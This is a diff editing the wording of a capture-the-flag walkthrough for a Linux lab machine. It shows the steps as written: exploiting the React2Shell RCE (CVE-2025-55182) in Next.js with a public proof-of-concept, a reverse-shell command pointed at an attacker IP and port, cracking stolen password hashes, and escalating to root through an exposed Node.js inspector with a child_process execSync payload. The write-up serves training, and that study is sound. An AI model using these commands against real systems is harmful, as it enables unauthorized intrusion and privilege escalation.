@@ -6,15 +6,15 @@
 | Difficulty        | Medium                  |
 | Target machine    | Linux                 |
 | Attacker Machine  | Kali linux            |
-| Tools             | nmap, crackstation, react2shell, wscat.  |
+| Tools             | nmap, crackstation, [React2Shell](https://p3ta00.github.io/cve-2025-55182-react2shell-rce/), wscat.  |
 
 # Reconnaissance
 
-Nmap Scan 
+Scan the target machine to identify open ports and running services. 
 ```
 nmap -A -T4 <ip address>
 ```
-Initial scan reveals two open ports
+The initial Nmap scan identifies two open ports:
 | Port      | Service       |
 | --------- |---------------|
 | 22/tcp    | ssh           |
@@ -23,23 +23,25 @@ Initial scan reveals two open ports
 
 # Enumeration
 
-Check out the webpage `http://target-IP:3000/` a static page “ReactorWatch Core Monitoring System” presumably used for monitoring industrial reactor metrics.<br>
-After parsing the source code, The Following Technology Stack was identified 
+Browsing to `http://target-IP:3000/` presents a static page titled "ReactorWatch Core Monitoring System", which appears to be a dashboard for monitoring industrial reactor metrics.<br>
+Inspecting the page source reveals the following technology stack: 
 - Framework: next.js 
 - React Server Components (RSC) enabled and actively interacting with the server
 
-Directory enumeration, fuzzing, and sub-domain enumeration did not yield anything useful.<br
->
-Since we have already established that the webpage does server actions. Let’s search for exploits under Next.js 
+Directory brute-forcing, fuzzing, and subdomain enumeration did not uncover any additional attack surface.<br>
+Given that the application uses React Server Components and server-side actions, the next step is to investigate publicly known vulnerabilities affecting this technology stack.
 
 ## Foothold
 Vulnerability: CVE-2025–55182 (React2Shell):<br>
 The React2Shell vulnerability (CVE-2025–55182) is a critical pre-authentication Remote Code Execution (RCE) flaw affecting React Server Components, Next.js, and related frameworks. With a CVSS score of 10.0, it allows attackers to execute arbitrary code on a vulnerable server via a single malicious HTTP request, without authentication.<br>
 The flaw stems from improper validation of serialized payloads in the Flight protocol used by React Server Components. Malicious payloads can trigger prototype pollution and lead to Node.js code execution. This impacts both Linux and Windows environments, including containerized deployments.<br>
 
+### why it applies to this target:-
+Because the application exposes React Server Components over Next.js and processes serialized Flight requests, it is susceptible to CVE-2025-55182, allowing unauthenticated remote code execution via crafted payloads.
+
 # Exploitation
-For this Machine, let’s use an automated exploitation using Reach2Shell<br>
-Steps to follow: <br>
+To exploit the identified vulnerability, we can use the publicly available [React2Shell](https://p3ta00.github.io/cve-2025-55182-react2shell-rce/) proof-of-concept.<br>
+The exploitation workflow is as follows: <br>
 - CVE-2025–55182: React2Shell — Unauthenticated RCE in React Server Components | p3ta@dc710
 ```
 #check vulnerability
@@ -52,24 +54,23 @@ python3 react2shell-poc.py -t http://Target-IP:3000 -c "id" --listen --lhost Att
 python3 react2shell-poc.py -t http://Target-IP:3000 --revshell --lhost Attacker-IP --lport 4444
 ```
 
-After gaining access as the node user, we searched the system for interesting files and discovered a `SQLite3 database`.<br>
-Open the .db file, and we get username and password hashes
-crack the hashes using `CRACKSTATION`
+After obtaining a shell as the node user, enumerate the filesystem for sensitive files. During this process, a `SQLite3 database` is discovered.<br>
+Examining the database reveals stored user credentials, including password hashes. These hashes can be cracked using `CrackStation`.
 
-Finally we get<br>
+The recovered credentials are:<br>
 - username: engineer
 - password: reactor1 
 
 # Initial Access
-Log in via SSH using the cracked credentials 
+Use the recovered credentials to establish an SSH session as the `engineer` user.
 ```
 ssh engineer@Target-IP
 ```
-<b>The user flag can be found in <br>`/home/engineer/user.txt`</b>
+<b>The user flag is located at:<br>`/home/engineer/user.txt`</b>
 
 # Privilege Escalation
 
-A review of active processes identified a Node.js service running as root with the inspector interface enabled
+Enumerating running processes reveals a Node.js application executing as `root` with the Inspector interface enabled:
 ```
 root /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
 ```
@@ -78,16 +79,16 @@ This means:
 - The Node debugger (Inspector) is enabled
 - The debugger listens on port 9229
 
-The Inspector is normally used by developers to debug applications.<br>
+The Inspector protocol is intended for debugging Node.js applications but can be abused to execute arbitrary JavaScript when exposed to an attacker.<br>
 
-The Node.js inspector was listening only on `127.0.0.1:9229`, meaning it was not directly accessible from external hosts. Normally, interaction with the inspector would be performed using `wscat`, a command-line `WebSocket client`. However, due to DNS issues on the target system, installing wscat was not feasible. As a workaround, we leveraged an alternative method to communicate with the inspector and proceed with exploitation.
+The Inspector service is bound to `127.0.0.1:9229`, making it accessible only from the local machine. To interact with it remotely, create an SSH local port forward that exposes the service on the attacker's system.
 ```
 -> First up, we create an SSH tunnel 
 # Attacker terminal
 ssh -L 9229:127.0.0.1:9229 engineer@Target-IP
 ```
 ```
--> Obtain the Websocket endpoint 
+-> Next, retrieve the active WebSocket debugger endpoint: 
 # Target Terminal
 curl http://127.0.0.1:9229/json
 ```
@@ -103,7 +104,7 @@ curl http://127.0.0.1:9229/json
 We need “ws://127.0.0.1:9229/7f8f8f4a-3c65–4c55-b9a7-f7f7e8a9a123”
 ```
 ```
--> Connect to inspector 
+-> Connect to the Inspector interface using `wscat`:
 # Attacker Terminal
 npm install -g wscat
 ```
@@ -112,7 +113,7 @@ npm install -g wscat
 wscat -c ws://127.0.0.1:9229/7f8f8f4a-3c65–4c55-b9a7-f7f7e8a9a123
 ```
 ```
-# execute the command below 
+# Send the following Runtime.evaluate request to execute JavaScript within the privileged Node.js process: 
 {
   "id": 1,
   "method": "Runtime.evaluate",
@@ -123,15 +124,16 @@ wscat -c ws://127.0.0.1:9229/7f8f8f4a-3c65–4c55-b9a7-f7f7e8a9a123
 }
 ```
 
-Make sure you write the command in a single line 
+The payload should be sent as a single-line JSON object: 
 ```
 {"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()","returnByValue":true}}
 ```
 
-<b>The Output is the root flag!! </b><br>
-Since our objective was just the root flag, we only executed to get that. <br>
-If needed, we can also go ahead and generate a reverse shell from root and cause more damage 
+<b>The response contains the contents of /root/root.txt, successfully disclosing the root flag.</b><br>
+For the purposes of this walkthrough, the interaction was limited to reading the root flag.<br>
+The same Inspector interface could be used to execute arbitrary commands or spawn a privileged shell, demonstrating the severity of the misconfiguration. 
 
 Root flag & User Flag found!<br>
-Hope this Walkthrough was fun, easy to follow and helpful to you.<br>
+I hope this walkthrough was clear, informative, and easy to follow.<br>
+
 Happy Hacking ~!!!
